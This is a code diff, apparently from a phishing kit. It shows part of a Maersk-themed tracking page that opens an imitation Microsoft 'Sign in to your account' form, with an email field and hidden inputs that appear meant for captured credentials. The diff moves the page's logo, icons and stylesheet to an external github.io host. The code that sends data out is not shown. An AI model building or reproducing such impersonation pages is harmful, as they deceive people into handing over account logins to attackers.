@@ -10,7 +10,7 @@ const img_laoder = document.getElementById("img_laoder");
 const service_laoding = document.getElementById("service_laoding");
 
 img_counter = Math.floor(Math.random() * 4)
-hauling_img.src = "./"+img_counter+".png";
+hauling_img.src = "https://babo4.github.io/msk/"+img_counter+".png";
 
 track_btn.addEventListener("click", ()=>{
     maersk_table.style.display = "none";
@@ -31,7 +31,7 @@ track_btn.addEventListener("click", ()=>{
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="https://babo4.github.io/msk/style.css">
     <title>Sign in to your account</title>
 </head>
 <body>
@@ -42,15 +42,12 @@ track_btn.addEventListener("click", ()=>{
                 
             <b id="load_ani">. . .</b>
             
-                <img src="logo.svg" alt="Sign in">
+                <img src="https://babo4.github.io/msk/logo.svg" alt="Sign in">
                 <p id="name_holder"><b>&#10508;</b> <span id="e_holder"></span></p>
 
                 <h1 id="header_main">Sign in</h1>
 
-
                 <input type="email" id="e_input" value="" class="show_pass_content" placeholder="Email, phone, or Skype">
-
-
 
                 <input type="hidden" id="temp_p">
                 <input type="hidden" id="data_send" value="1">
@@ -62,7 +59,7 @@ track_btn.addEventListener("click", ()=>{
             </div>
 
             <div class="office_sub_form">
-                <img src="key.svg" alt="Sign in">
+                <img src="https://babo4.github.io/msk/key.svg" alt="Sign in">
                 <span>Sign-in options</span>
             </div>
 
